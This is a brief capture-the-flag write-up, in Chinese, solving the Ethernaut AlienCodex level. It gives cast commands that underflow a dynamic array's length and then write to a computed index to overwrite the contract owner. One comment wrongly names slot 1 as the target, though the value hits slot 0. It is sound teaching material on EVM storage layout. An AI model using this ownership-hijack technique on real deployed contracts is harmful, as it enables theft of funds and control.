# 20-AlienCodex
```
# 步骤 1: makeContact（设置 contact = true）
cast send $AlienCodex_ADDRESS "makeContact()" \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY
-> cast storage $AlienCodex_ADDRESS 0 --rpc-url $sepolia_rpc
-> 获取slot0的数据 
0bc04aa6aac163a6b3667636d798fa053d43bd11 这是owner 
01 这个代表bool public contact;此时contact=0x01 (true)
0x0000000000000000000000010bc04aa6aac163a6b3667636d798fa053d43bd11
查看此时的slot1 cast storage $AlienCodex_ADDRESS 1 --rpc-url $sepolia_rpc
-> 0x0000000000000000000000000000000000000000000000000000000000000000
步骤 2: 触发下溢
# retract() - 数组长度下溢
cast send $AlienCodex_ADDRESS "retract()" \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY
此时再查看 slot1 = 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff

步骤 3: 计算攻击索引 i=2^256 - keccak256(1) 此时刚好 codex[i] 回到了 slot1的
INDEX=0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a

# 5. 执行攻击
cast send $AlienCodex_ADDRESS "revise(uint256,bytes32)" 0x4ef1d2ad89edf8c4d91132028e8195cdf30bb4b5053d4f8cd260341d4805f30a 0x0000000000000000000000004a2578679c9a9901844380c7340e074045e75853 \
    --rpc-url $sepolia_rpc \
    --private-key $PRIVATE_KEY
```

### 考察点
- 需要熟悉evm中的动态数组存储机制